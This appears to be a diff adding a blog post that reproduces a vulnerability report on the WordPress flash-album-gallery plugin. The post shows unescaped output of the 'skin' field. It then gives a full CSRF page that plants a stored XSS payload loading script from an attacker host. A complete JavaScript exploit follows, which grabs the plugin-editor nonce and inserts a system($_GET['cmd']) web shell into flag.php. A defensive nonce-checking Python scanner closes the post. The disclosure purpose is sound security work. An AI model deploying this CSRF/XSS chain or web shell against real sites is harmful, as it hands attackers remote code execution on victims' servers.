+<span class="x">    </span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="cp">?&gt;</span><span class="x"></span>
+<span class="x">                                    &lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;save&quot; /&gt;</span>
+<span class="x">                                    &lt;input style=&quot;width: 80%;&quot; type=&quot;text&quot; id=&quot;items_array&quot; name=&quot;items_array&quot; readonly=&quot;readonly&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$added</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
+<span class="x">                                    &lt;input type=&quot;hidden&quot; name=&quot;playlist_title&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">esc_html</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]));</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
+<span class="x">===&gt;                                &lt;input type=&quot;hidden&quot; name=&quot;skinname&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;skin&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
+<span class="x">===&gt;                                &lt;input type=&quot;hidden&quot; name=&quot;skinaction&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;skin&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
+<span class="x">                                    &lt;textarea style=&quot;display: none;&quot; name=&quot;playlist_descr&quot; cols=&quot;40&quot; rows=&quot;1&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">esc_html</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$playlist</span><span class="p">[</span><span class="s1">&#39;description&#39;</span><span class="p">]));</span> <span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;</span>
+<span class="x">                                    &lt;input name=&quot;addToPlaylist&quot; class=&quot;button-secondary&quot; type=&quot;submit&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nx">_e</span><span class="p">(</span><span class="s1">&#39;Update Playlist&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
+<span class="x">    </span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>Hence, the form which creates the request is also responsible for the
+writing the tainted data back to the screen. If find it rather strange
+that<br />
+all the other echo function usages are wrapped with <code>esc_html()</code> calls
+but it was forgotten that $playlist['skin'] holds tainted data as
+well.<br />
+Maybe the changes in the last fix [As reported by 'Ken S'] weren't that
+deep. But more likely, this is just another bug which hasn't been found
+before.</p>
+<h3>Now what can an attacker do with this exploit?</h3>
+<p>He could gain access to the server and remote code execution for
+example. Imagine we tricked an wordpress administrator which<br />
+still has valid admin cookies for his wordpress site [Which is quite
+often the case when you look at your blog] into visiting a<br />
+site with a hidden form. You cold for example write a comment on the
+wordpress site with a link to the attacking site, which incorporates<br />
+the attacking code below. This would be a quite strong attack, since
+every wordpress administrator is happy to see comments on his site
+[Source:<br />
+I am a wordpress admin myself]. Then he is genuinely interested to
+follow the link. Why should he assume that it is dangerous? Lot's of
+people leave<br />
+the link of their own sites in wordpress comment section. As soon as
+the wordpress administrator [He needs to be logged in, which is normally
+the case]<br />
+follows the link, the server is entirely busted. No need to crack
+password hashes or find further privilege escalation ways. Why? See
+below the code that<br />
+is executed if he follows the link:</p>
+<div class="highlight"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;title&gt;</span>Stored XSS CSRF exploit.<span class="nt">&lt;/title&gt;</span>
+        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=UTF-8&quot;</span><span class="nt">&gt;</span>
+
+        <span class="nt">&lt;script&gt;</span>
+            <span class="kd">function</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">()</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// For recent browsers.</span>
+                    <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Older IE 6,7,8</span>
+                    <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP.3.0&quot;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">return</span> <span class="nx">ref</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="kd">function</span> <span class="nx">send_payload</span><span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">TARGET_URL</span> <span class="o">=</span> <span class="s2">&quot;http://localhost/wordpress/wp-admin/admin.php?page=flag-banner-box&amp;playlist=null&amp;mode=edit&quot;</span><span class="p">;</span>
+                <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+                <span class="nx">req</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
+                <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;success_indicator&quot;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;payload sent.&quot;</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">TARGET_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+                <span class="nx">req</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+                <span class="cm">/* Build the post data */</span>
+                <span class="kd">var</span> <span class="nx">pd</span> <span class="o">=</span>  <span class="p">{</span><span class="s2">&quot;playlist_title&quot;</span><span class="o">:</span> <span class="s2">&quot;sometitle&quot;</span><span class="p">,</span>
+                           <span class="s2">&quot;playlist_descr&quot;</span><span class="o">:</span> <span class="s2">&quot;some_description&quot;</span><span class="p">,</span>
+                           <span class="s2">&quot;mode&quot;</span><span class="o">:</span> <span class="s2">&quot;save&quot;</span><span class="p">,</span>
+                           <span class="s2">&quot;skinname&quot;</span><span class="o">:</span> <span class="s1">&#39;&quot; &#39;</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">,</span>
+                           <span class="s2">&quot;item_array[0]&quot;</span><span class="o">:</span> <span class="s2">&quot;notimportant&quot;</span><span class="p">};</span>
+
+                <span class="nx">postdata</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+                <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">pd</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">postdata</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">key</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">pd</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="nx">postdata</span> <span class="o">=</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// rstrip the last &amp;</span>
+
+                <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">postdata</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="nt">&lt;/script&gt;</span> 
+    <span class="nt">&lt;/head&gt;</span>
+
+    <span class="nt">&lt;body&gt;</span>
+        <span class="nt">&lt;script&gt;</span><span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="s2">&quot;&lt;script type=&quot;</span><span class="nx">text</span><span class="o">/</span><span class="nx">javascript</span><span class="s2">&quot; src=&quot;</span><span class="nx">http</span><span class="o">:</span><span class="err">//atacker.com/exploit.js&quot;&gt;//Nothin here</span><span class="nt">&lt;/script&gt;</span>&quot;; send_payload(payload);<span class="nt">&lt;/script&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">&quot;success_indicator&quot;</span><span class="nt">&gt;&lt;/div&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</pre></div>
+
+
+<p>Then as soon as the payload is executed, the following exploit code is
+loaded from another site which actually<br />
+does the evil stuff [See code above, the last lines are probably the
+most interesting]. It basically uses the upload functionality in
+wordpress to change plugincode.<br />
+This leads to remote code execution and the worst case scenario
+happened: An attacker can issue system() calls with the permissions<br />
+of the web server.</p>
+<h3>The exploit code:</h3>
+<div class="highlight"><pre><span class="cm">/* </span>
+<span class="cm"> * Copyright: Nikolai Tschacher.</span>
+<span class="cm"> * Site: incolumitas.com</span>
+<span class="cm"> * Easy as pie.</span>
+<span class="cm"> * What: Use this code when you found a stored XSS in a wordpress plugin to gain RCE.</span>
+<span class="cm"> * How: A wordpress admin needs to run this code in his browser with a valid session id.</span>
+<span class="cm"> * Idea: Mofify the flash-album-gallery plugin via wordpress admin panel.</span>
+<span class="cm"> * </span>
+<span class="cm"> * Note: This is actually nothing new. It&#39;s just one of many ways to gain RCE</span>
+<span class="cm"> *       if you have a stored XSS in a wordpress session.</span>
+<span class="cm"> */</span>
+
+<span class="c1">// Without php tags</span>
+<span class="c1">// HTML meta chars are in character entity references format.</span>
+<span class="kd">var</span> <span class="nx">EXPLOIT_CODE</span> <span class="o">=</span> <span class="s2">&quot;\nif (isset($_GET[&amp;#039;cmd&amp;#039;])&amp;amp;&amp;amp; !empty($_GET[&amp;#039;cmd&amp;#039;])){ echo &amp;#039;&lt;pre&gt;&amp;#039;;system($_GET[&amp;#039;cmd&amp;#039;]);echo &amp;#039;&lt;/pre&gt;&amp;#039;; }&quot;</span><span class="p">;</span>
+
+<span class="c1">// TARGET SETTINGS. Set stuff here.</span>
+<span class="kd">var</span> <span class="nx">TARGET_WP_PATH</span> <span class="o">=</span> <span class="s2">&quot;http://localhost/wordpress&quot;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">PLUGIN_EDITOR_URL</span> <span class="o">=</span> <span class="nx">TARGET_WP_PATH</span> <span class="o">+</span> <span class="s2">&quot;/wp-admin/plugin-editor.php&quot;</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">PLUGIN_EDIT_URL</span> <span class="o">=</span> <span class="nx">PLUGIN_EDITOR_URL</span> <span class="o">+</span> <span class="s2">&quot;?file=flash-album-gallery/flag.php&quot;</span><span class="p">;</span>
+
+
+<span class="kd">function</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">ref</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">XMLHttpRequest</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// For recent browsers.</span>
+        <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">ActiveXObject</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Older IE 6,7,8</span>
+        <span class="nx">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;MSXML2.XMLHTTP.3.0&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">ref</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* Extract the nonce */</span>
+<span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">req</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+    <span class="nx">req</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="sr">/name=&quot;_wpnonce&quot;\svalue=\&quot;[a-z0-9]{10}\&quot;/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">nonce</span> <span class="o">=</span>  <span class="sr">/[a-z0-9]{10}/</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="c1">// The sites not available. Maybe the plugin is not installed?!</span>
+                <span class="nx">nonce</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+
+            <span class="p">}</span>
+            <span class="nx">modify_plugin</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">responseText</span><span class="p">,</span> <span class="nx">nonce</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="nx">PLUGIN_EDIT_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="cm">/* Modify the plugin with malicous code with plugin editor */</span>
+<span class="kd">function</span> <span class="nx">modify_plugin</span><span class="p">(</span><span class="nx">responseText</span><span class="p">,</span> <span class="nx">nonce</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get the plugin code</span>
+    <span class="c1">// On each wordpress plugin edit site, there&#39;s just one textarea tag.</span>
+    <span class="c1">// The plugin code itself lies between the textarea tags.</span>
+    <span class="c1">// These regexes aren&#39;t really good.</span>
+    <span class="kd">var</span> <span class="nx">startIndex</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/&lt;textarea.*?name=&quot;newcontent&quot;.*?&gt;/</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">stopIndex</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/&lt;\/textarea&gt;/</span><span class="p">);</span>
+    <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">responseText</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">startIndex</span><span class="p">.</span><span class="nx">index</span><span class="o">+</span><span class="nx">startIndex</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">length</span><span class="p">,</span> <span class="nx">stopIndex</span><span class="p">.</span><span class="nx">index</span><span class="p">);</span>
+
+    <span class="c1">// add our exploit code at the beginning of the plugin after the &quot;// Stop direct call&quot; comment.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="sr">/((\/){2}\sStop\sdirect\scall)/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">pluginCode</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/((\/){2}\sStop\sdirect\scall)/</span><span class="p">,</span> <span class="s2">&quot;$1&quot;</span> <span class="o">+</span> <span class="nx">EXPLOIT_CODE</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// Let&#39;s go for the first line after the obligatory wp plugin comment and lets use the closing comment</span>
+        <span class="c1">// characters */ as needle as a fallback.</span>
+        <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">pluginCode</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^(\*\/)/m</span><span class="p">,</span> <span class="s2">&quot;$1&quot;</span> <span class="o">+</span> <span class="s2">&quot;\n&quot;</span> <span class="o">+</span> <span class="nx">EXPLOIT_CODE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// We need to consider that the plugin code in this state is making use of Character entity references</span>
+    <span class="c1">// for all html meta characters like &quot; &#39; &lt; &gt; &amp; \ to avoid them of being interepreted as markup.</span>
+    <span class="c1">// We need to replace them with their &quot;real&quot; characters, before we send the plugin as post data.</span>
+    <span class="nx">pluginCode</span> <span class="o">=</span> <span class="nx">removeCharEntityReferences</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">);</span>
+
+    <span class="c1">// Ready to build our POST request</span>
+    <span class="nx">preq</span> <span class="o">=</span> <span class="nx">getXMLHttpRequestObject</span><span class="p">();</span>
+    <span class="nx">preq</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">preq</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="nx">preq</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">successPattern</span> <span class="o">=</span> <span class="sr">/File\sedited\ssuccessfully./</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">successPattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">preq</span><span class="p">.</span><span class="nx">responseText</span><span class="p">))</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Done.&quot;</span><span class="p">);</span>
+                <span class="c1">// Notify the attacker that the exploit has been spawned.</span>
+            <span class="k">else</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Nope.&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">preq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">PLUGIN_EDITOR_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nx">preq</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-Type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+
+    <span class="nx">pd</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="nx">_wpnonce</span><span class="o">:</span> <span class="nx">nonce</span><span class="p">,</span>
+        <span class="nx">_wp_http_referer</span><span class="o">:</span> <span class="nx">PLUGIN_EDIT_URL</span> <span class="o">+</span> <span class="s2">&quot;&amp;a=te&amp;scrollto=0&quot;</span><span class="p">,</span>
+        <span class="nx">a</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+        <span class="nx">scrollto</span><span class="o">:</span> <span class="s2">&quot;192&quot;</span><span class="p">,</span>
+        <span class="nx">newcontent</span><span class="o">:</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">pluginCode</span><span class="p">),</span>
+        <span class="nx">action</span><span class="o">:</span> <span class="s2">&quot;update&quot;</span><span class="p">,</span>
+        <span class="nx">file</span><span class="o">:</span> <span class="s2">&quot;flash-album-gallery/flag.php&quot;</span><span class="p">,</span>
+        <span class="nx">plugin</span><span class="o">:</span> <span class="s2">&quot;flash-album-gallery/flag.php&quot;</span><span class="p">,</span>
+        <span class="nx">submit</span><span class="o">:</span> <span class="s2">&quot;Update+File&quot;</span>
+    <span class="p">};</span>
+    <span class="c1">// Build the post data.</span>
+    <span class="nx">postdata</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">pd</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">postdata</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">key</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">pd</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nx">postdata</span> <span class="o">=</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">postdata</span><span class="p">.</span><span class="nx">length</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// rstrip the last &amp;</span>
+    <span class="nx">preq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">postdata</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/*</span>
+<span class="cm"> * Removes the HTML char entity references for the HTML meta characters.</span>
+<span class="cm"> */</span>
+<span class="kd">function</span> <span class="nx">removeCharEntityReferences</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">((</span><span class="k">typeof</span> <span class="nx">data</span><span class="p">)</span> <span class="o">!==</span> <span class="s2">&quot;string&quot;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s2">&quot;data needs to be a string&quot;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;quot;/g</span><span class="p">,</span> <span class="s2">&quot;\&quot;&quot;</span><span class="p">);</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;#039;/g</span><span class="p">,</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">);</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;lt;/g</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span><span class="p">);</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;gt;/g</span><span class="p">,</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">);</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;amp;/g</span><span class="p">,</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="nx">data</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">exploit</span><span class="p">();</span>
+</pre></div>
+
+
+<h3>Conclusion</h3>
+<p>What was shown above, is just one specific bug in the
+flash-album-gallery plugin. I think that there might be lots more. If
+you want to see me notes<br />
+of my work, please visit the following file I made during my research
+at very bottom of this [large] mail.</p>
+<p>But honestly, I have to say you that there are still lots of bugs in the
+code and that it would need a rather large amount of time and<br />
+some dull hours of work to locate the vast majority of them [Forget
+about finding all bugs in software in general]. This means, that I<br />
+won't continue spending a lot of time on this project.</p>
+<p>Additionally, I have sent this writeup to the wordpress-security bug
+bounty program because you know, I would always be happy for some dimes
+to<br />
+keep my server runnin :D</p>
+<p>If you have questions, feel free to contact me.</p>
+<p>I am going to publish this mail on my blog as soon as you guys updated
+the code and the users had some time to switch versions. But please keep
+in mind:<br />
+I would really do some serious work in order to find all the bugs!</p>
+<p>I advise to uninstall it and NOT use this plugin, before big changes are
+made to improve the security architecture.</p>
+<p>PS: Maybe you are interested too have a look on the script I wrote to
+locate bugs like this:</p>
+<div class="highlight"><pre><span class="c"># PYTHON NONCE INCONSISTENT USE REVEALER</span>
+<span class="c"># COPYRIGHT: Nikolai Tschacher</span>
+<span class="c"># Site: incolumitas.com</span>
+
+<span class="c"># Walks thorugh a plugin and tries to reveals some inconsistency with nonces which</span>
+<span class="c"># could lead to some vulnerabilities. Sometimes, nonces are created, but never validated.</span>
+<span class="c"># Just a nonce itself does nothing, the action must be actually confirmed.</span>
+
+<span class="c"># This simply finds all nonces and looks if some stay unchecked. If this is the case, the</span>
+<span class="c"># nonce is useless and there&#39;s maybe a threat.</span>
+
+<span class="c"># About: http://www.prelovac.com/vladimir/improving-security-in-wordpress-plugins-using-nonces</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">fnmatch</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="c"># If a nonce is created but never checked with wp_verify_nonce() (or descendants), the nonce is</span>
+<span class="c"># senseless and no security barrier at all. This script tries to find this flaw.</span>
+
+<span class="c"># Nonces are random, one time tokens which are usally send with a critical request/form</span>
+<span class="c"># a user can execute in a application. Before the action takes place, the app has to confirm</span>
+<span class="c"># that the nonce is the same as genertated while the form was crafted. If this is not the case,</span>
+<span class="c"># a user is most likely tricked into submitting a form without his consent, since he has never</span>
+<span class="c"># seen the form and thus the nonce hasn&#39;t been created and automatically submitted. This prevents</span>
+<span class="c"># CSRF attacks and makes most sql injections and xss attacks rather hard.</span>
+
+<span class="c"># Approach: We treat simply all strings between braces as possible action arguments. There will be</span>
+<span class="c"># a lot of false positives. But making the regex accurate is simply not feasible because the function</span>
+<span class="c"># calling syntax is ways to hard to parse [lazy and yeah, guilty :D]</span>
+<span class="n">R_NONCE_CREATION</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;(wp_nonce_field|wp_create_nonce|wp_nonce_url)(\s*)\(.*?\)&#39;</span><span class="p">)</span>
+
+<span class="n">R_STRING</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;(</span><span class="se">\&#39;</span><span class="s">|&quot;).*?\1&#39;</span><span class="p">)</span>
+
+<span class="c"># Nonces are normally confirmed before the critical action in wp code begins.</span>
+<span class="c"># There are several functions to confirm nonces depending on the situation</span>
+<span class="c"># the form/actions orign. They can be found in \wp-includes\pluggable.php</span>
+<span class="c"># - wp_verify_nonce($nonce, $action = -1)</span>
+<span class="c"># - check_ajax_referer( $action = -1, $query_arg = false, $die = true )</span>
+<span class="c"># - check_admin_referer($action = -1, $query_arg = &#39;_wpnonce&#39;)</span>
+<span class="n">R_NONCE_CHECK</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s">r&#39;(check_ajax_referer|wp_verify_nonce|check_admin_referer)(\s*)\(.*?\)&#39;</span><span class="p">)</span>
+
+<span class="n">matches</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">checked</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">def</span> <span class="nf">apply_on_file_content</span><span class="p">(</span><span class="n">root_path</span><span class="p">,</span> <span class="n">callback</span><span class="p">):</span>
+    <span class="n">pattern</span> <span class="o">=</span> <span class="s">&#39;.php&#39;</span>
